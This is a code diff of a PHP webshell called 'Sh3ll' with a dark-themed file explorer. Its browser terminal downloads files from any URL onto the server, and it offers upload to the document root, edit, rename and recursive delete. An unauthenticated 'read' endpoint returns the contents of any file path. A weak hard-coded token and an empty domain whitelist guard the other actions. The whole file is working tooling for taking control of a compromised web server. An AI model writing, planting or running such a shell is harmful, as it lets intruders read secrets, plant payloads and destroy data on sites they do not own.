@@ -1,8 +1,8 @@
 <?php
-// remotedl_radical.php
-// Single-file webshell + terminal UI + secure remote-download + CRUD file ops
+// remotedl_radical_explorer.php
+// Radical dark webshell + file explorer + terminal + secure remote-download + CRUD
 // CONFIG - ganti sebelum dipakai:
-define('REMOTE_DL_TOKEN','el_R4d1c@l_#2025'); // wajib ganti
+define('REMOTE_DL_TOKEN','el1337'); // ganti token
 $REMOTE_DL_WHITELIST = []; // contoh ['example.com'] kosong = semua domain diizinkan
 // END CONFIG
 
@@ -10,35 +10,30 @@ set_time_limit(0);
 error_reporting(0);
 header('X-Content-Type-Options: nosniff');
 
-// -------------------- Utilities --------------------
+// ---------- UTIL ----------
 function now(){ return date('Y-m-d H:i:s'); }
 function jout($arr){ header('Content-Type: application/json'); echo json_encode($arr); exit; }
 function safe_name($s){ return preg_replace('/[^A-Za-z0-9._-]/','_',$s); }
 function is_token_ok($t){ return hash_equals(REMOTE_DL_TOKEN, (string)$t); }
-function pwd_join($base,$rel){ $base=rtrim($base, "/\\"); return $base.DIRECTORY_SEPARATOR.ltrim($rel, "/\\"); }
 function log_op($entry){
     $dir = getcwd();
     $f = $dir.DIRECTORY_SEPARATOR.'.remotedl_ops.log';
     @file_put_contents($f, json_encode($entry,JSON_UNESCAPED_SLASHES).PHP_EOL, FILE_APPEND|LOCK_EX);
 }
+function esc($s){ return htmlspecialchars($s, ENT_QUOTES); }
 
-// -------------------- Action endpoints (AJAX) --------------------
+// ---------- AJAX / API ----------
 if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['api'])){
     $api = $_POST['api'];
-    // Require token for mutating ops
-    $token = $_POST['token'] ?? '';
-    // helper to respond with standard structure
-    if ($api === 'exec_cmd'){ // terminal command: only download allowed
+    if ($api === 'exec_cmd'){
+        $token = $_POST['token'] ?? '';
         if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
         $cmd = trim($_POST['cmd'] ?? '');
         if ($cmd === '') jout(['ok'=>false,'msg'=>'Empty command']);
         $parts = preg_split('/\s+/', $cmd, 3);
-        if (strtolower($parts[0] ?? '') !== 'download' || !isset($parts[1])){
-            jout(['ok'=>false,'msg'=>'Allowed: download <url> [filename]']);
-        }
+        if (strtolower($parts[0] ?? '') !== 'download' || !isset($parts[1])) jout(['ok'=>false,'msg'=>'Allowed: download <url> [filename]']);
         $url = $parts[1];
         $opt = $parts[2] ?? '';
-        // validate URL
         if (!filter_var($url, FILTER_VALIDATE_URL)) jout(['ok'=>false,'msg'=>'Invalid URL']);
         $host = parse_url($url, PHP_URL_HOST) ?: '';
         global $REMOTE_DL_WHITELIST;
@@ -46,12 +41,10 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['api'])){
             $ok=false; foreach($REMOTE_DL_WHITELIST as $d) if (stripos($host,$d)!==false){$ok=true;break;}
             if(!$ok) jout(['ok'=>false,'msg'=>'Domain not allowed']);
         }
-        // compute target in current dir (client supplies current path)
-        $cwd = realpath($_POST['cwd'] ?? getcwd());
-        if ($cwd === false) $cwd = getcwd();
+        $cwd = realpath($_POST['cwd'] ?? getcwd()) ?: getcwd();
+        if (!is_dir($cwd)) jout(['ok'=>false,'msg'=>'Invalid cwd']);
         $filename = $opt !== '' ? safe_name(basename($opt)) : safe_name(basename(rawurldecode(parse_url($url,PHP_URL_PATH)?:'download.bin')));
         $target = $cwd . DIRECTORY_SEPARATOR . $filename;
-        // download via cURL or file_get_contents
         $ok=false; $err='';
         if (function_exists('curl_init')){
             $ch = curl_init($url);
@@ -81,25 +74,22 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['api'])){
         else jout(['ok'=>false,'msg'=>$err]);
     }
 
-    // file delete
     if ($api === 'delete'){
+        $token = $_POST['token'] ?? '';
         if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
         $path = $_POST['path'] ?? '';
         if ($path === '') jout(['ok'=>false,'msg'=>'No path']);
         $real = realpath($path);
         if ($real === false) jout(['ok'=>false,'msg'=>'Path not found']);
-        // safety: disallow deleting script itself
-        if (strpos($real, __FILE__) !== false) jout(['ok'=>false,'msg'=>'Refuse to delete script']);
-        // permission check
-        if (!is_writable($real)) jout(['ok'=>false,'msg'=>'Permission denied for unlink']);
-        $res = is_dir($real) ? (xrmdir_ajax($real) ? true : false) : @unlink($real);
+        if (strpos($real, realpath(__FILE__)) !== false) jout(['ok'=>false,'msg'=>'Refuse to delete script']);
+        if (!is_writable($real) && !is_writable(dirname($real))) jout(['ok'=>false,'msg'=>'Permission denied']);
+        $res = is_dir($real) ? xrmdir_ajax($real) : @unlink($real);
         log_op(['time'=>now(),'op'=>'delete','path'=>$real,'ok'=>$res?1:0,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
-        if ($res) jout(['ok'=>true,'msg'=>'Deleted']);
-        else jout(['ok'=>false,'msg'=>'Delete failed (locked or permission)']);
+        if ($res) jout(['ok'=>true,'msg'=>'Deleted']); else jout(['ok'=>false,'msg'=>'Delete failed (locked or permission)']);
     }
 
-    // rename
     if ($api === 'rename'){
+        $token = $_POST['token'] ?? '';
         if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
         $path = $_POST['path'] ?? ''; $new = $_POST['new'] ?? '';
         if ($path===''||$new==='') jout(['ok'=>false,'msg'=>'Missing path or new name']);
@@ -108,12 +98,11 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['api'])){
         if (!is_writable($dir)) jout(['ok'=>false,'msg'=>'Parent dir not writable']);
         $ok = @rename($real,$target);
         log_op(['time'=>now(),'op'=>'rename','from'=>$real,'to'=>$target,'ok'=>$ok?1:0,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
-        if ($ok) jout(['ok'=>true,'msg'=>'Renamed','path'=>$target]);
-        else jout(['ok'=>false,'msg'=>'Rename failed (permission or exists)']);
+        if ($ok) jout(['ok'=>true,'msg'=>'Renamed','path'=>$target]); else jout(['ok'=>false,'msg'=>'Rename failed (permission or exists)']);
     }
 
-    // edit (save file)
     if ($api === 'edit'){
+        $token = $_POST['token'] ?? '';
         if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
         $path = $_POST['path'] ?? ''; $content = $_POST['content'] ?? '';
         if ($path==='') jout(['ok'=>false,'msg'=>'No file']);
@@ -122,11 +111,9 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['api'])){
         if (!is_writable($real)) jout(['ok'=>false,'msg'=>'File not writable']);
         $w = @file_put_contents($real, $content);
         log_op(['time'=>now(),'op'=>'edit','path'=>$real,'len'=>is_numeric($w)?$w:0,'ok'=>$w!==false?1:0,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
-        if ($w!==false) jout(['ok'=>true,'msg'=>'Saved']);
-        else jout(['ok'=>false,'msg'=>'Write failed']);
+        if ($w!==false) jout(['ok'=>true,'msg'=>'Saved']); else jout(['ok'=>false,'msg'=>'Write failed']);
     }
 
-    // quick file read (no token)
     if ($api === 'read'){
         $path = $_POST['path'] ?? '';
         if ($path==='') jout(['ok'=>false,'msg'=>'No file']);
@@ -137,11 +124,10 @@ if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['api'])){
         jout(['ok'=>true,'content'=>$data,'path'=>$real]);
     }
 
-    // unknown
     jout(['ok'=>false,'msg'=>'Unknown api']);
 }
 
-// -------------------- Helper for directory recursive delete (used in AJAX) --------------------
+// ---------- helper for recursive delete ----------
 function xrmdir_ajax($dir){
     $items = @scandir($dir);
     if ($items === false) return false;
@@ -154,33 +140,27 @@ function xrmdir_ajax($dir){
     return @rmdir($dir);
 }
 
-// -------------------- Page rendering (radical dark CSS + terminal + panels) --------------------
-// determine current browsing directory
-$lokasi = isset($_GET['path']) ? $_GET['path'] : getcwd();
-$lokasi = str_replace(['\\'],'/',$lokasi);
-$lokasi = realpath($lokasi) ?: getcwd();
+// ---------- Determine current directory (safe) ----------
+$lokasi_req = isset($_GET['path']) ? $_GET['path'] : '';
+if ($lokasi_req !== ''){
+    // normalize and avoid escaping root
+    $lokasi_req = str_replace(['..','\\'], ['','/'], $lokasi_req);
+    $lokasi = realpath($lokasi_req) ?: getcwd();
+} else {
+    $lokasi = getcwd();
+}
+$lokasi = str_replace('\\','/',$lokasi);
 $listing = @scandir($lokasi);
-function esc($s){ return htmlspecialchars($s, ENT_QUOTES); }
 
-// CSS + minimal JS
+// ---------- HTML / UI (radical dark) ----------
 ?>
 <!doctype html>
 <html lang="en"><head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Sh3ll — Radical RemoteDL</title>
+<title>Sh3ll — Radical Explorer</title>
 <style>
-:root{
-  --bg:#07060a;
-  --panel:#0b0b0f;
-  --accent:#7cffb2;
-  --accent2:#00d4ff;
-  --muted:#7a8b8c;
-  --danger:#ff6b6b;
-  --card:#07090b;
-  --glass:rgba(255,255,255,0.03);
-  --mono: 'Courier New',monospace;
-}
+:root{ --bg:#07060a; --panel:#0b0b0f; --accent:#7cffb2; --accent2:#00d4ff; --muted:#7a8b8c; --danger:#ff6b6b; --glass:rgba(255,255,255,0.03); --mono:'Courier New',monospace; }
 *{box-sizing:border-box}
 html,body{height:100%;margin:0;background:radial-gradient(circle at 10% 10%, #0b0d12 0%, #050406 40%, #050306 100%);color:#cfe;font-family:Inter,system-ui,Segoe UI,Arial}
 .container{max-width:1200px;margin:18px auto;padding:18px}
@@ -206,7 +186,8 @@ html,body{height:100%;margin:0;background:radial-gradient(circle at 10% 10%, #0b
 .file-upload{display:flex;gap:8px;align-items:center;margin-top:10px}
 .log{font-size:12px;color:var(--muted);margin-top:8px;border-top:1px dashed rgba(255,255,255,0.02);padding-top:8px}
 .footer{text-align:center;color:var(--muted);margin-top:18px}
-.controls select,input[type=text]{background:#071018;border:1px solid rgba(255,255,255,0.02);color:#cfe;padding:6px;border-radius:6px}
+.breadcrumb{margin:8px 0;color:var(--muted);font-size:13px}
+.breadcrumb a{color:var(--accent2);text-decoration:none}
 @media(max-width:980px){ .layout{grid-template-columns:1fr} .terminal{height:240px} }
 </style>
 </head><body>
@@ -214,7 +195,7 @@ html,body{height:100%;margin:0;background:radial-gradient(circle at 10% 10%, #0b
   <div class="header">
     <div>
       <div class="brand">Sh3ll</div>
-      <div class="path small">Directory : <span class="mono"><?php echo esc($lokasi); ?></span></div>
+      <div class="path small">Current: <span class="mono"><?php echo esc($lokasi); ?></span></div>
     </div>
     <div class="toolbar">
       <button class="btn" onclick="location.href='?path=<?php echo urlencode($lokasi); ?>'">Refresh</button>
@@ -225,6 +206,26 @@ html,body{height:100%;margin:0;background:radial-gradient(circle at 10% 10%, #0b
 
   <div class="layout">
     <div class="card">
+      <div class="breadcrumb">
+        <?php
+        // breadcrumb
+        $parts = explode('/', trim(str_replace('\\','/',$lokasi), '/'));
+        $acc = '';
+        if (substr(PHP_OS,0,3)==='WIN'){ // windows drive support
+            // show full path as single link
+            echo "<a href='?path=".urlencode($lokasi)."'>".esc($lokasi)."</a>";
+        } else {
+            echo "<a class='link' href='?path=".urlencode('/') ."'>/</a>";
+            $build = '';
+            foreach($parts as $p){
+                if ($p === '') continue;
+                $build .= '/'.$p;
+                echo " <span class='small'>/</span> <a class='link' href='?path=".urlencode($build)."'>".esc($p)."</a>";
+            }
+        }
+        ?>
+      </div>
+
       <h3 class="small">Files</h3>
       <div style="overflow:auto;max-height:520px">
         <table class="table">
@@ -241,9 +242,7 @@ html,body{height:100%;margin:0;background:radial-gradient(circle at 10% 10%, #0b
                 echo "<td>".($isdir? "<a class='link' href='{$link}'>".esc($e)."</a>": "<a class='link' href='{$link}'>".esc($e)."</a>")."</td>";
                 echo "<td>".esc($size)."</td>";
                 echo "<td>".esc(statusnya($full))."</td>";
-                // options: delete rename edit (ajax)
-                echo "<td>";
-                echo "<div class='form-inline'>";
+                echo "<td><div class='form-inline'>";
                 echo "<button class='btn' onclick=\"doEdit('".esc($full)."')\">Edit</button>";
                 echo "<button class='btn' onclick=\"doRename('".esc($full)."')\">Rename</button>";
                 echo "<button class='btn warn' onclick=\"doDelete('".esc($full)."')\">Delete</button>";
@@ -279,7 +278,7 @@ html,body{height:100%;margin:0;background:radial-gradient(circle at 10% 10%, #0b
       </div>
 
       <div class="card" style="margin-top:12px">
-        <h4 class="small">Quick controls</h4>
+        <h4 class="small">Controls</h4>
         <div class="small">Token (set in config). Do not expose token publicly.</div>
         <div style="margin-top:8px">
           <input id="token" type="text" placeholder="paste token here" style="width:100%;padding:8px;border-radius:6px;background:#021214;color:#cfe">
@@ -298,13 +297,7 @@ const consoleEl = document.getElementById('consoleOut');
 const tokenEl = document.getElementById('token');
 const cwd = "<?php echo addslashes($lokasi); ?>";
 
-function appendLine(msg, cls=''){
-  const d = document.createElement('div');
-  d.textContent = msg;
-  if (cls) d.className = cls;
-  consoleEl.appendChild(d);
-  consoleEl.scrollTop = consoleEl.scrollHeight;
-}
+function appendLine(msg, cls=''){ const d=document.createElement('div'); d.textContent=msg; if(cls) d.className=cls; consoleEl.appendChild(d); consoleEl.scrollTop=consoleEl.scrollHeight; }
 function clearConsole(){ consoleEl.innerHTML=''; }
 
 document.getElementById('runBtn').addEventListener('click', runCmd);
@@ -313,14 +306,10 @@ document.getElementById('cmd').addEventListener('keydown', e => { if (e.key==='E
 async function runCmd(){
   const cmd = document.getElementById('cmd').value.trim();
   const token = tokenEl.value.trim();
-  if (!cmd){ appendLine('Empty command',''); return; }
+  if (!cmd){ appendLine('Empty command'); return; }
   appendLine('> '+cmd);
   appendLine('Running...');
-  const fd = new FormData();
-  fd.append('api','exec_cmd');
-  fd.append('cmd',cmd);
-  fd.append('token',token);
-  fd.append('cwd',cwd);
+  const fd = new FormData(); fd.append('api','exec_cmd'); fd.append('cmd',cmd); fd.append('token',token); fd.append('cwd',cwd);
   try {
     const r = await fetch('', {method:'POST', body:fd});
     const j = await r.json();
@@ -332,18 +321,15 @@ async function runCmd(){
 async function uploadFile(){
   const f = document.querySelector('input[name=file]').files[0];
   const dir = document.querySelector('select[name=targetdir]').value;
-  const fd = new FormData(); fd.append('upload', '1'); fd.append('u_file', f);
-  fd.append('dir', dir);
-  const out = document.getElementById('uplog');
-  out.textContent = 'Uploading...';
+  if (!f){ document.getElementById('uplog').textContent='No file selected'; return; }
+  const fd = new FormData(); fd.append('upload', '1'); fd.append('u_file', f); fd.append('dir', dir);
+  const out = document.getElementById('uplog'); out.textContent='Uploading...';
   try {
     const r = await fetch(window.location.href, { method:'POST', body:fd });
     const text = await r.text();
     out.textContent = text;
-    location.reload();
-  } catch(e){
-    out.textContent = 'Upload error: '+e.message;
-  }
+    setTimeout(()=>location.reload(),700);
+  } catch(e){ out.textContent = 'Upload error: '+e.message; }
 }
 
 async function doDelete(path){
@@ -376,7 +362,6 @@ async function doEdit(path){
 }
 
 async function viewLog(){
-  const token = tokenEl.value.trim();
   const fd = new FormData(); fd.append('api','read'); fd.append('path', cwd + '/dl.log');
   const r = await fetch('', {method:'POST', body:fd}); const j = await r.json();
   const v = document.getElementById('logview');
@@ -386,7 +371,7 @@ async function viewLog(){
 </script>
 </body></html>
 <?php
-// -------------------- Server-side upload handling (non-AJAX) --------------------
+// ---------- Server-side upload handling ----------
 if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['upload']) && isset($_FILES['u_file'])){
     $diropt = $_POST['dir'] ?? 'current';
     $base = ($diropt==='docroot' && isset($_SERVER['DOCUMENT_ROOT'])) ? rtrim($_SERVER['DOCUMENT_ROOT'],'/\\') : $lokasi;
